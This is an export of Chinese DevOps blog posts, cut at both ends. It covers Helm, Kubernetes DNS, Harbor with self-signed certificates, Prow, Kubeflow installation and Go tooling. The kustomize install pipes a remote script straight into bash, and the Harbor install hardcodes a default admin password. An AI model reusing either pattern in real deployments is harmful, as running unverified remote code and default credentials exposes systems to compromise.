值设置错误时，能够给出更好的错误提示。\n2.4 现在需要应用名字了 如果没有提供应用名，在 Helm 2 中，将会随机生成一个；在 Helm 3 中，将会报错（如果还是想使用随机名称，可以加上 — generate-name 标识）。\n2.5 移除了 Helm serve 本来就没有很多人使用 helm serve（用来给开发，在机器上跑一个本地的 Chart Repository）。现在 helm serve 移除了。但是你仍然可以以插件的形式安装。\n2.6 不再自动创建命名空间 当在不存在的 Namespace 中创建应用时，Helm 2 将会自动创建 Namespace 。Helm 3 遵循其他 Kubernetes 工具的惯例，如果 Namespaces 不存在，则返回错误。\n3. 参考 https://itnext.io/helm2-vs-helm3-part-1-c76c29106e99 ","description":"","id":318,"section":"post","tags":["翻译","Helm","Kubernetes"],"title":"Helm 2 、Helm 3 比较","uri":"https://www.chenshaowen.com/blog/helm-2-vs-helm-3.html"},{"content":"副标题: 物联网创利模型和全新实践\n作者: 【日】大前研一\n译者: 朱悦玮\n出版社: 北京时代华文书局有限公司\n出版年: 2019-2-1\nISBN: 9787569932171\nNotes:\n作者是非常著名的管理学家，我之前读过他写的另外一本书 《思考的技术》。\n本书主要阐述的是 IoT 的重要性和如何将 IoT 落地产生效益。万物感知，让我们获取到更准确有用的信息。从城市治理到 3D 打印、工业 4.0 、车联网，都与 IoT 密切相关，其中很多内容已经进入实质性实施阶段。\n但我想说的是，大的技术变革一定是以技术群的形式出现的。IoT 技术需要结合 5G、云计算、大数据等才能发挥效用，特别是大数据。IoT 完成了数据的采集，5G 完成了数据的传输，而要产生收益就需要具备对海量数据进行管理和分析的能力。\n","description":"","id":319,"section":"post","tags":["书籍","IoT","技术"],"title":"IoT 变现","uri":"https://www.chenshaowen.com/blog/book/the-iot-land.html"},{"content":"1. 关于 DNS 1.1 DNS 服务的用途 DNS 提供的是域名到 IP 的映射服务。例如，在浏览器输入 https://www.chenshaowen.com 访问页面，但数据链路是基于 IP 的通信，无法识别 www.chenshaowen.com 。这时就需要进行 DNS 查询，输入参数是 www.chenshaowen.com ，返回结果是 IP 地址。\n可以看到 DNS 提供了一种助记方法，我们不必关注 IP 地址以及其变动，而只需记住一段英文字符串，就能够找到服务。\n一种常见的服务发现机制是配置管理中心，存储 Key/Value 值，例如 Consul、ZooKeeper、Etcd 等。而 DNS 提供的功能，也可以满足微服务架构中服务发现的需求，Kubernetes 就是采用的这种方式。\nKubernetes 从 1.11 版本开始，使用 CoreDNS 替代 KubeDNS 成为了内置的 DNS 服务。\n1.2 resolv.conf /etc/resolv.conf 是 DNS 客户端的配置文件，主要有四部分组成：\nnameserver ，DNS 服务器的 IP 地址 domain ，本地域名的后缀 search ，搜索的域名后缀 sortlist ，对查询结果进行特定排序 当遇到无法解析的域名时，解析器才会用到 domain 、search 。例如，访问 http://abc/index.html， 解析器无法解析 abc ，就会拼接 domain 或 search 的配置作为后缀继续解析。当配置了 search 时，domain 失效。\n2. CoreDNS 2.1 简介 CoreDNS 是 CNCF 正式毕业的项目。它是一个基于 Caddy 实现，模块化且可插拔的 DNS 服务器。\n每个插件都遵循一个特定的接口协议。在 Corefile 文件中采用 DSL 定义 DNS 服务，可以很方便地开启各种插件，定制 DNS 服务。下面是一个示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 example.org:8000 { file example.org prometheus errors log } .:8000 { kubernetes proxy . 8.8.8.8 log errors cache } 这个配置暴露了一个 DNS Server ，监听在 8000 端口，根据不同的域名匹配不同的处理逻辑。每个逻辑，加载指定的插件处理。\n2.2 相关插件 常用的插件包括：\nhosts，配置集群全局可解析的 hosts ，需要注意的是域名后缀需要与 search 保持一致，例如，cluster.local ，否则 nodelocaldns 无法上报 coredns 解析 errors， 错误记录到 stdout health，提供健康报告接口 kubernetes，解析为 Kubernetes 集群服务的 IP 地址 prometheus，提供 Prometheus 的 Metrics 接口 proxy，不在集群域内的查询转到指定解析器 cache，启用缓存 loop，检测死循环，并中断 reload，自动加载 Corefile，热更新 loadbalance，DNS 负载均衡器 2.3 集群 ConfigMap 配置 查看 CoreDNS 的服务： 1 2 3 kubectl -n kube-system get svc coredns coredns ClusterIP 10.233.0.3 \u0026lt;none\u0026gt; 53/UDP,53/TCP,9153/TCP 5h 查看 CoreDNS 的配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 kubectl -n kube-system get cm coredns -o yaml apiVersion: v1 data: Corefile: | .:53 { errors health ready kubernetes cluster.local in-addr.arpa ip6.arpa { pods insecure upstream /etc/resolv.conf fallthrough in-addr.arpa ip6.arpa } hosts { 127.1.1.1 example.org fallthrough } prometheus :9153 forward . /etc/resolv.conf { prefer_udp } cache 30 loop reload loadbalance } DNS 的默认端口是 53 。cluster.local 、 in-addr.arpa 、 ip6.arpa 格式的域名将被解析为 Kubernetes 的内部 IP 地址。\nhosts 中的 fallthrough 配置非常重要，未匹配的域名继续向下匹配。\n2.4 运维建议 如果是在生产环境更新，建议仅进行容器级别进行灰度更新，而不要让 CoreDNS 发生节点变化。\n因为不同节点的 /etc/resolv.conf 可能不同，会无法回滚配置。\n3. NodelocalDNS 3.1 简介 为了避免 Pod 进行 DNS 解析时，频繁查询 CoreDNS ，NodelocalDNS 在每个节点上都以 DaemonSet 运行 DNS 缓存以提高集群性能。\nNodelocalDNS 的原理是，运行一个 hostNetwork 网络模式的 Pod，创建一个网卡绑定本地 DNS 的 IP 地址。节点上的 Pod 请求 DNS 解析时，将被拦截到 NodelocaDNS 。NodelocalDNS 通过取缓存或向上游请求 DNS ，完成解析过程。\n3.2 集群 ConfigMap 配置 查看 NodelocalDNS 服务 1 2 3 kubectl -n kube-system get ds nodelocaldns nodelocaldns 1 1 1 1 1 \u0026lt;none\u0026gt; 5h 查看 NodelocalDNS 配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 kubectl -n kube-system get cm nodelocaldns -o yaml apiVersion: v1 data: Corefile: | cluster.local:53 { errors cache { success 9984 30 denial 9984 5 } reload loop bind 169.254.25.10 forward . 10.233.0.3 { force_tcp } prometheus :9253 health 169.254.25.10:9254 } in-addr.arpa:53 { errors cache 30 reload loop bind 169.254.25.10 forward . 10.233.0.3 { force_tcp } prometheus :9253 } ip6.arpa:53 { errors cache 30 reload loop bind 169.254.25.10 forward . 10.233.0.3 { force_tcp } prometheus :9253 } .:53 { errors cache 30 reload loop bind 169.254.25.10 forward . /etc/resolv.conf prometheus :9253 } ... 同样使用 53 端口提供 DNS 服务，但是根据不同的域名，NodelocalDNS 提供了不同的解析策略。 cluster.local、in-addr.arpa、ip6.arpa 格式的域名从 CoreDNS 解析后缓存到本地，其他则使用节点的 DNS 解析后缓存。\n3.3 运维建议 在生产过程中，有时不会部署 NodeLocalDNS ，而是直接使用 CoreDNS 。\n这样做并不是一个好的选择，原因主要在于: 如果想要切换 DNS 服务时，修改 CoreDNS 的配置将会影响整个集群，而无法仅修改指定的节点做灰度测试。\n生产环境建议强烈建议部署 NodeLocalDNS ，这样可以保证集群的稳定性。\n4. Kubernetes Pod 中的 DNS 解析 创建测试用的 Pod 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 cat \u0026gt; busybox.yaml \u0026lt;\u0026lt;-EOF apiVersion: v1 kind: Pod metadata: name: busybox namespace: default spec: containers: - name: busybox image: busybox:1.28.4 command: - sleep - \u0026#34;3600\u0026#34; imagePullPolicy: IfNotPresent restartPolicy: Always EOF 1 kubectl apply -f busybox.yaml 查看 DNS 解析配置 1 2 3 4 5 kubectl exec busybox cat /etc/resolv.conf nameserver 169.254.25.10 search default.svc.cluster.local svc.cluster.local cluster.local options ndots:5 解析正常的内部服务 1 2 3 4 5 6 7 kubectl exec -ti busybox -- nslookup kubernetes.default Server: 169.254.25.10 Address 1: 169.254.25.10 Name: kubernetes.default Address 1: 10.233.0.1 kubernetes.default.svc.cluster.local 解析链路：nodelocaldns -\u0026gt; 缓存 -\u0026gt; coredns -\u0026gt; 返回 IP\n其中涉及 search 添加域名后缀的逻辑，在此不再表述。\n解析不存在的服务 1 2 3 4 5 6 kubectl exec -ti busybox -- nslookup a.b Server: 169.254.25.10 Address 1: 169.254.25.10 nslookup: can\u0026#39;t resolve \u0026#39;a.b\u0026#39; 解析链路：nodelocaldns -\u0026gt; 节点配置的 DNS -\u0026gt; 未找到\n解析正常的外部服务 1 2 3 4 5 6 7 kubectl exec -ti busybox -- nslookup www.chenshaowen.com Server: 169.254.25.10 Address 1: 169.254.25.10 Name: www.chenshaowen.com Address 1: 163.181.33.208 解析逻辑：nodelocaldns -\u0026gt; 节点配置的 DNS -\u0026gt; 返回 IP\n5. ExternalName - CNAME 解析 ExternalName Service 是 Service 的一个特例，没有选择器，可以用于给外部服务取一个内部别名。\n创建 ExternalName Service 1 2 3 4 5 6 7 8 9 10 cat \u0026gt; externalname.yaml \u0026lt;\u0026lt;-EOF apiVersion: v1 kind: Service metadata: name: chenshaowen namespace: default spec: type: ExternalName externalName: www.chenshaowen.com EOF 1 kubectl apply -f externalname.yaml 测试访问内部服务 1 2 3 4 5 6 7 kubectl exec -ti busybox -- nslookup chenshaowen.default Server: 169.254.25.10 Address 1: 169.254.25.10 Name: chenshaowen.default Address 1: 58.215.145.110 chenshaowen.default 将会被映射到 www.chenshaowen.com ，这是通过 DNS 的 CNAME 记录实现的。\n6. 参考 https://kubernetes.io/docs/tasks/administer-cluster/dns-custom-nameservers/ https://github.com/coredns https://draveness.me/dns-coredns/ ","description":"","id":320,"section":"post","tags":["博文","Kubernetes","DNS","域名"],"title":"Kubernetes 中的 DNS 服务","uri":"https://www.chenshaowen.com/blog/dns-server-in-kubernetes.html"},{"content":" helm 官方源 https://charts.helm.sh/stable ，国内的某些机器无法访问，需要配置镜像源。\n1. 官方镜像源 1 helm repo add stable https://charts.helm.sh/stable 2. Git Pages 镜像 1 helm repo add stable https://burdenbear.github.io/kube-charts-mirror/ 可以参考 kube-charts-mirror ，搭建一个自主可控的镜像源。\n3. Aliyun 镜像 长时间未更新，版本较旧\n1 helm repo add stable https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts/ 4. Azure 镜像源 已经不可用，2021.07.08 更新。\n1 2 helm repo add stable http://mirror.azure.cn/kubernetes/charts/ helm repo add incubator http://mirror.azure.cn/kubernetes/charts-incubator/ ","description":"","id":321,"section":"post","tags":["博文","Helm","Kubernetes","国内"],"title":"国内的 Helm 镜像源","uri":"https://www.chenshaowen.com/blog/configure-helm-mirror-in-china.html"},{"content":" 在之前的文章 使用 Helm 安装 harbor 中，我已经详细描述了安装 Ingress 、Harbor ，最后成功推送镜像的步骤。其中的域名是公网可以访问的，证书是认证机构签发的。但是在内网环境下，我们需要使用内网域名进行访问。本文主要解决使用自签证书通过 Https 访问 Harbor 的问题。\n1. 生成自签证书 这里以 *.harbor.dev.chenshaowen.com 域名为例。\n1.1 创建 CA 证书 生成 CA 证书私钥 1 openssl genrsa -out ca.key 4096 生成 CA 证书 1 2 3 4 openssl req -x509 -new -nodes -sha512 -days 3650 \\ -subj \u0026#34;/C=CN/ST=Beijing/L=Beijing/O=example/OU=Personal/CN=dev.chenshaowen.com\u0026#34; \\ -key ca.key \\ -out ca.crt 1.2 创建域名证书 生成私钥 1 openssl genrsa -out harbor.dev.chenshaowen.com.key 4096 生成证书签名请求 CSR 1 2 3 4 openssl req -sha512 -new \\ -subj \u0026#34;/C=CN/ST=Beijing/L=Beijing/O=example/OU=Personal/CN=*.harbor.dev.chenshaowen.com\u0026#34; \\ -key harbor.dev.chenshaowen.com.key \\ -out harbor.dev.chenshaowen.com.csr 生成 x509 v3 扩展 1 2 3 4 5 6 7 8 9 10 11 12 cat \u0026gt; v3.ext \u0026lt;\u0026lt;-EOF authorityKeyIdentifier=keyid,issuer basicConstraints=CA:FALSE keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1=harbor.dev.chenshaowen.com DNS.2=*.harbor.dev.chenshaowen.com DNS.3=hostname EOF 创建 Harbor 访问证书 1 2 3 4 5 openssl x509 -req -sha512 -days 3650 \\ -extfile v3.ext \\ -CA ca.crt -CAkey ca.key -CAcreateserial \\ -in harbor.dev.chenshaowen.com.csr \\ -out harbor.dev.chenshaowen.com.crt 将 crt 转换为 cert ，以供 Docker 使用 1 openssl x509 -inform PEM -in harbor.dev.chenshaowen.com.crt -out harbor.dev.chenshaowen.com.cert 最终在目录下得到如下文件：\n1 2 3 ls ca.crt ca.key ca.srl harbor.dev.chenshaowen.com.cert harbor.dev.chenshaowen.com.crt harbor.dev.chenshaowen.com.csr harbor.dev.chenshaowen.com.key v3.ext 2. 部署 Harbor 安装 Ingress Controller 1 helm install --name nginx-ingress --set \u0026#34;rbac.create=true,controller.service.externalIPs[0]=192.168.13.20\u0026#34; stable/nginx-ingress 创建 Namespace 1 kubectl create ns harbor 创建证书秘钥 1 kubectl create secret tls harbor.dev.chenshaowen.com --key harbor.dev.chenshaowen.com.key --cert harbor.dev.chenshaowen.com.crt -n harbor 添加 Chart 库 1 2 helm repo add harbor https://helm.goharbor.io helm repo update 安装 Harbor 1 2 3 4 5 6 7 helm install --name harbor --namespace harbor harbor/harbor \\ --set expose.ingress.hosts.core=core.harbor.dev.chenshaowen.com \\ --set expose.ingress.hosts.notary=notary.harbor.dev.chenshaowen.com \\ --set expose.tls.secretName=harbor.dev.chenshaowen.com \\ --set persistence.enabled=true \\ --set externalURL=https://core.harbor.dev.chenshaowen.com \\ --set harborAdminPassword=Harbor12345 如果没有默认的 storageClass 可以将 persistence.enabled 设置为 false ，不使用持久化存储。\n如果需要使用持久化存储可以参考文档，使用 StorageClass 提供 PV 动态存储。\n3. 配置及使用 3.1 页面访问 配置 hosts 之后，通过 https://core.harbor.dev.chenshaowen.com 访问：\n这是因为自签的证书不被信任。我们需要将 harbor.dev.chenshaowen.com.crt 证书导入系统，下面以 OS X 系统为例：\n将证书保存一份到本地，拖拽到 Keychain 中，然后双击证书，设置为 Always Trust 。如下图：\n再次访问时，就可以正常打开页面登陆。\n3.2 Docker 访问 将拷贝证书至 Docker 的证书配置目录 1 2 3 4 mkdir -p /etc/docker/certs.d/core.harbor.dev.chenshaowen.com/ cp harbor.dev.chenshaowen.com.cert /etc/docker/certs.d/core.harbor.dev.chenshaowen.com/ cp harbor.dev.chenshaowen.com.key /etc/docker/certs.d/core.harbor.dev.chenshaowen.com/ cp ca.crt /etc/docker/certs.d/core.harbor.dev.chenshaowen.com/ 这里的 core.harbor.dev.chenshaowen.com 目录一定要与服务保持一致，如果有端口，也应该用 : 连接带上。\n登陆 core.harbor.dev.chenshaowen.com 1 2 3 4 5 6 7 8 docker login core.harbor.dev.chenshaowen.com -u admin Password: WARNING! Your password will be stored unencrypted in /root/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credentials-store Login Succeeded 推送镜像 1 docker tag nginx core.harbor.dev.chenshaowen.com/library/nginx 1 2 3 4 5 6 7 docker push core.harbor.dev.chenshaowen.com/library/nginx The push refers to repository [core.harbor.dev.chenshaowen.com/library/nginx] be91fceb796e: Pushed 919b6770519b: Pushed b60e5c3bcef2: Pushed latest: digest: sha256:6b3b6c113f98e901a8b1473dee4c268cf37e93d72bc0a01e57c65b4ab99e58ee size: 948 页面查看推送的镜像 由于推送之后，我又删除本地镜像，再次拉取，这里的下载次数为 1 。\n","description":"","id":322,"section":"post","tags":["博文","Harbor","Kubernetes","Https","镜像"],"title":"Harbor 使用自签证书支持 Https 访问","uri":"https://www.chenshaowen.com/blog/support-https-access-harbor-using-self-signed-cert.html"},{"content":"1. 关于 Prow 在 Kubernetes、Istio 等知名项目的 Github 仓库中，我们经常会看到 xxx-bot 用户，给 issues 添加标签、合并 PR 。这个机器人账户就是被 Prow 驱动的。\nProw 是 Kubernetes 测试特别兴趣小组的项目，目前是 kubernetes/test-infra 的一部分。Prow 是一个基于 Kubernetes 使用各类事件驱动执行 Job 的 CI/CD 系统。\n除了执行 Job ，Prow 还能通过以下方式，实现 GitHub 的自动化功能：\n策略配置，权限控制等 /label 形式的 chat-ops 命令 自动合并 PR 使用 Prow ，我们可以将研发流程自动化，极大地提升了开发体验。\n2. 工作原理 Prow 采用的是微服务架构。核心组件如下：\nhook 是核心无状态服务，负责监听 Github Webhook 并将其分发到指定的插件 plank 是控制器，负责管理作业的生命周期 deck 是系统的 Dashboard horologium 用来创建周期型的 Job sinker 定时清理无用的 Job 工作流程:\n在 issues 中，评论 /assign @someone 。Github 通过 Webhook 将该事件发送给 Prow 。事件到达 hook 组件，再传给各个 PlugIn 。 PlugIn 通过解析事件的 body 数据，判断是否需要创建 ProwJob 。Prowjob 是一个 Job 的 CRD 。最终执行 Job ，将相关的内容指派给 someone ，将文本转换为行为。\n关于插件：\n在 prow/plugins 仓库中，我们可以找到一些内置的插件。当然，我们也可以通过扩展插件定制 Prow 的行为。\n3. 在 Kubernetes 集群部署 Prow 准备机器人账户 在生产环境，通常会使用一个类似 xxx-bot 的账户专用于 Prow 的行为，以区分人的操作。如果仅是测试，使用个人账户也可以。\n将机器人账户添加为仓库管理员。\n生成用于 Github 访问的 token 登陆机器人账户，在 settings/tokens 页面，新建一个 token: xxxTokenxxx ，勾选 repo:status 和 public_repo 权限。\n使用 Github token 创建集群 secret 1 2 echo \u0026#34;xxxTokenxxx\u0026#34; \u0026gt; oauth-token kubectl create secret generic oauth-token --from-file=oauth=./oauth-token 在集群生成 hmac ，用于 Github 的 Webhook 认证 1 2 openssl rand -hex 20 \u0026gt; hmac-token kubectl create secret generic hmac-token --from-file=hmac=./hmac-token 查看 hmac 值，将用于 Github 中 Webhook 的配置。\n1 2 3 cat ./hmac-token xxxHmacxxx 部署 Prow 1 kubectl apply -f https://raw.githubusercontent.com/kubernetes/test-infra/88d10dbea046ad481973ab734ffea21b1cc8ff86/prow/cluster/starter.yaml 查看全部 Pod 是否全部 Running 1 kubectl get pod 查看服务访问的端口 1 2 3 4 5 6 7 kubectl get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE deck NodePort 10.233.52.176 \u0026lt;none\u0026gt; 80:32284/TCP 16m hook NodePort 10.233.30.53 \u0026lt;none\u0026gt; 8888:30381/TCP 16m kubernetes ClusterIP 10.233.0.1 \u0026lt;none\u0026gt; 443/TCP 4h31m tide NodePort 10.233.26.103 \u0026lt;none\u0026gt; 80:30855/TCP 16m 这里由于仅用于测试，没有配置 Ingress ，下面会以 ServiceIp + NodePort 的形式进行配置，其中 ServiceIp 为部署的主机 IP 。\n查看页面 访问 deck 组件提供的 Dashboard ：http://ServiceIP:32284/\n4. 新仓库配置 给 Github 仓库添加 Webhook 配置 Payload URL 需要带上 /hook 路由。Content Type 需要选择 application/json 。Secret 是上面生成的 xxxHmacxxx 值。\n给 Github 仓库添加 OWNERS 文件 OWNERS 文件用于申明模块的 approvers 和 reviewers ，在 PR 流程中会用到。每个目录都可以使用 OWNERS 进行控制，这里在仓库根目录下添加该文件并提交。其中的 someone 用户，将可以通过评论 /lgtm ，合并 PR 。这里 Prow 中定义的规则是，同时存在 /lgtm 和 /approve 标签时，PR 将会被合并。但是存在一个特例，approver 可以省略 /approve 而直接使用 /lgtm 合并 PR，同时 approver 提交的 PR 会被加上 /approve 。\nOWNERS 文件：\n1 2 3 4 5 approvers: - someone reviewers: - someone 启用指定插件 创建插件描述文件 plugins.yaml ，这里以 shaowenchen/prow-test 仓库为例。如果是多个仓库，可以按照 yaml 语法，列在 plugins 下。\nplugins.yaml 文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 plugins: shaowenchen/prow-test: - size - lgtm - approve - label - trigger - hold - verify-owners - wip - milestone - welcome - heart - help - assign 执行命令:\n1 2 3 kubectl create configmap plugins \\ --from-file=plugins.yaml=./plugins.yaml --dry-run -o yaml \\ | kubectl replace configmap plugins -f - 配置 Tide Tide 用于 PR 的合并，多个仓库可以按照 yaml 语法新增在 repos 字段下。prowjob_namespace 用于配置 deck、tide 等组件查询 prowjob 的 namespace。如果不是使用 default 进行部署，则需要进行配置。没有配置时，会出现 cannot list resource \u0026quot;prowjobs\u0026quot; in default namespace 的错误提示。\nconfig.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 prowjob_namespace: \u0026#34;default\u0026#34; tide: merge_method: kubeflow/community: squash target_url: http://ServiceIp:30855/tide queries: - repos: - shaowenchen/prow-test labels: - lgtm - approved missingLabels: - do-not-merge - do-not-merge/hold - do-not-merge/work-in-progress - needs-ok-to-test - needs-rebase context_options: from-branch-protection: true skip-unknown-contexts: true orgs: org: required-contexts: - \u0026#34;check-required-for-all-repos\u0026#34; repos: repo: required-contexts: - \u0026#34;check-required-for-all-branches\u0026#34; branches: branch: from-branch-protection: false required-contexts: - \u0026#34;required_test\u0026#34; optional-contexts: - \u0026#34;optional_test\u0026#34; 执行命令:\n1 kubectl create configmap config --from-file=config.yaml=./config.yaml --dry-run -o yaml | kubectl replace configmap config -f - 定制标签（可选） 通过 /xxx xxx 评论，能够给 issues 或 PR 添加标签。前提是仓库中已经新建了相关的二维标签。 如果需要定制标签，可以参考 内置标签 定义自己的 labels.yaml 。\n执行命令：\n1 2 3 kubectl create configmap label-config \\ --from-file=labels.yaml=labels.yaml --dry-run -o yaml \\ | kubectl replace configmap config -f - checkconfig 工具 克隆 Prow 的代码仓库 kubernetes/test-infra/prow ，使用 Go 命令执行内置的命令。\n1 2 git clone https://github.com/kubernetes/test-infra cd test-infra 1 go run ./prow/cmd/checkconfig -plugin-config path/to/plugins.yaml -config-path path/to/config.yaml 5. 使用测试 Pony 插件测试 Tide 合并 PR 测试 6. 参考文档 https://github.com/kubernetes/test-infra/tree/master/prow https://www.servicemesher.com/blog/prow-quick-start-guide https://github.com/kubesphere-test/prow-tutorial ","description":"","id":323,"section":"post","tags":["博文","DevOps","Prow","Kubernetes","CICD"],"title":"DevOps 工具链之 Prow","uri":"https://www.chenshaowen.com/blog/prow-of-devops-tool-chain.html"},{"content":"1. 安装基础环境 安装 Kubernetes 参考链接：使用 Kubeadm 安装 Kubernetes 集群\n。值得注意的是 Kubeflow 并不是对每个版本的 Kubernetes 兼容，system-requirements。\n1 2 3 4 kubectl version Client Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;15\u0026#34;, GitVersion:\u0026#34;v1.15.12\u0026#34;, GitCommit:\u0026#34;e2a822d9f3c2fdb5c9bfbe64313cf9f657f0a725\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-05-06T05:17:59Z\u0026#34;, GoVersion:\u0026#34;go1.12.17\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} Server Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;15\u0026#34;, GitVersion:\u0026#34;v1.15.12\u0026#34;, GitCommit:\u0026#34;e2a822d9f3c2fdb5c9bfbe64313cf9f657f0a725\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-05-06T05:09:48Z\u0026#34;, GoVersion:\u0026#34;go1.12.17\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} 安装 kustomize 1 2 curl -s \u0026#34;https://raw.githubusercontent.com/kubernetes-sigs/kustomize/master/hack/install_kustomize.sh\u0026#34; | bash mv kustomize /usr/local/bin/ 1 2 3 kustomize version {Version:kustomize/v3.5.5 GitCommit:897e7b6e61e65188d846c32bd3af9ef68b0f746a BuildDate:2020-05-11T16:51:33Z GoOs:linux GoArch:amd64} 2. 安装 Kubefolow 确保有默认的 StorageClass 1 2 3 4 kubectl get sc NAME PROVISIONER AGE nfs-client (default) cluster.local/nfs-client-nfs-client-provisioner 8m57s 参考链接：使用-StorageClass-提供-PV-动态存储\n下载 kfctl 1 wget https://github.com/kubeflow/kubeflow/releases/download/v1.0/kfctl_v1.0-0-g94c35cf_linux.tar.gz 1 2 tar -xvf *_linux.tar.gz mv kfctl /usr/local/bin/ 安装环境变量 1 2 3 4 5 6 7 mkdir /home/kubeflow export KF_NAME=\u0026#34;mykubeflow\u0026#34; export BASE_DIR=\u0026#34;/home/kubeflow\u0026#34; export KF_DIR=${BASE_DIR}/${KF_NAME} export CONFIG_URI=\u0026#34;https://raw.githubusercontent.com/kubeflow/manifests/v1.0-branch/kfdef/kfctl_k8s_istio.v1.0.2.yaml\u0026#34; 开始安装 mkdir -p ${KF_DIR} cd ${KF_DIR} kfctl apply -V -f ${CONFIG_URI} 查看部署状态，等待完成 1 kubectl -n kubeflow get pod --watch 3. 查看 UI 页面 Kubeflow 通过 istio-ingressgateway 提供访问入口。由于没有 LoadBalancer ，这里将服务的 type 改为 NodePort ，执行命令：\n1 for i in \u0026#39;istio-ingressgateway\u0026#39;; do kubectl patch service $i -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;NodePort\u0026#34;}}\u0026#39; -n istio-system; done 查看访问端口：\n1 2 3 kubectl get svc -n istio-system | grep istio-ingressgateway istio-ingressgateway NodePort 10.233.27.126 \u0026lt;none\u0026gt; 15020:32305/TCP,80:31380/TCP,443:31390/TCP,31400:31400/TCP,15029:31128/TCP,15030:32594/TCP,15031:31617/TCP,15032:31969/TCP,15443:32559/TCP 1h 打开页面，http://{HOST_IP}:31380\n","description":"","id":324,"section":"post","tags":["博文","Kubeflow","Kubernetes","机器学习"],"title":"如何使用 kfctl 安装 Kubeflow","uri":"https://www.chenshaowen.com/blog/how-to-install-kubeflow-using-kfctl.html"},{"content":"VS Code 安装 Go 插件之后，打开 Go 项目时，编辑器会提示安装工具包。\n但是 golang.org 无法直接访问，我们需要将包手动下载到 GOPATH 目录，进行安装。\n创建包目录 1 2 cd $GOPATH mkdir -p src/golang.org/x 下载包 1 2 3 cd src/golang.org/x git clone https://github.com/golang/tools.git git clone https://github.com/golang/lint.git 安装包 1 2 go get golang.org/x/tools/... go get github.com/golangci/golangci-lint/cmd/golangci-lint@v1.27.0 ","description":"","id":325,"section":"post","tags":["博文","Go","VSCode","插件"],"title":"VS Code 无法下载 Go 插件的工具包","uri":"https://www.chenshaowen.com/blog/can-not-download-packages-in-vs-code.html"},{"content":"1. 关于服务业 第一产业是以农业为代表的，解决生存问题；第二产业是以工业为代表的，解决效率问题；第三产业是以服务业为代表的，解决别人的问题。\n除非某种因素导致人的生理存在受到威胁，服务业具有极其广阔的成长空间。因为人的欲望是没有天花板的，人与人之间处于一种复杂的相互服务、协作的状态，足以让发展持续下去。同时，只有第三产业能够容纳足够的就业人口，政府也会鼓励第三产业的发展，前景甚好。\n利他主义是服务业的核心思想。这也是大乘佛教的根本理念，在国内具有普遍的群众认知。在成就别人的同时，也成就了自己。这一点上与互联网倡导的分享不谋而合。\n没有哪个行业比 IT 行业更热衷于分享。有的是一些免费的服务，域名解析、代码托管、搜索等；有的是一些应急的物品，自行车、雨伞、充电宝等；有的是一些思想的交流，技术分享、行业大会等。\n2. 开放的心态 IT 行业 99 % 的有用文档，都可以在互联网上检索到，还有 1 % 是即将被遗弃的部分。\n没人用、不被人所知的内容，很快就会被替代；有缺陷但有用、被人所知的内容，会不断得到优化，帮助更多人。这是一个自发演进的过程。\nIT 工程师应该具有开放的心态，让更多人知道自己的产出物。可以是一篇文档、一段代码、一个设计、一种工具、一次思考等，甚至任何你知道别人不知道的知识，都应该被鼓励。知识的流动滋养了团队的成长，也加深了自己的理解。\n3. 工具文化 强调利他是为了明确思考的出发点，开放心态是为了增强团队的战斗力，但落脚点还得是实实在在的产品。\n科技公司通常十分盛行工具文化。Facebook 就是将最优秀的员工，用于工具的开发。招一个普通员工是在做加发，招一个能造工具的员工就是在给其他员工做乘法。好用的工具，能够提高工作效率，事半功倍。\n工具应该用于固化技能。人的优势在于，能够不断适应变化、面对挑战，创造性的解决问题。对于流程化的技能，我们应该将它固化。对于个人来说，是对认知的一次梳理、对思维的一次清空；对于团队来说，是一次沉淀积累，可以成倍创造收益。\n如此，研发可以考虑写一个生成某方案的脚手架，测试可以考虑写一个自动化测试的流水线，安全工程师可以考虑写一个拦截攻击的中间件等，将自己的技能用工具表达出来即可。\n不用担心工具会降低自己的价值，工具是需要人维护的，越多人用才会越有价值。\n4. 急人之所急，忧人之所忧 “ 好的，现在我知道了，要利他，要找或者造工具。具体是哪些工具呢？”\n急人之所急，忧人之所忧。同理心驱使你发现需求，“ Don’t make me think ” 让你打造更好的工具，也可以称之为产品。“ Don’t make me think ” 是一本书名，用在这里我认为十分适宜。\n可以一步到位，就不要分解动作；可以自动，就不要手动。\n帮助别人解决问题，让别人少跑点路、少花点钱、少思考点，这就是服务。如果这是一种群体性行为，那么人类将得到更大发展。这让我联想起长勺子。\n“ 天堂和地狱都是用长勺子吃饭。在地狱每个人用长勺子吃饭，勺子比胳膊长，所以吃不到嘴里，饥饿难耐，苦不堪言。在天堂每个人用长勺子吃饭，勺子比胳膊长，大家相互喂食吃，其乐融融，幸福无边。”\n","description":"","id":326,"section":"post","tags":["博文","思考","文化"],"title":"工程师更应具有服务精神","uri":"https://www.chenshaowen.com/blog/engineers-need-more-sense-of-service.html"},{"content":"1. 分阶段构建 编译项目需要借助一系列特定的工具，但在运行阶段并不需要这些工具。为了减小镜像体积，可以分阶段构建。在第一阶段进行构建，然后将编译生成的文件传入下一个阶段，生成更小体积的镜像。\n1 2 3 4 5 6 7 8 9 10 11 FROM golang:1.12 as builder COPY / 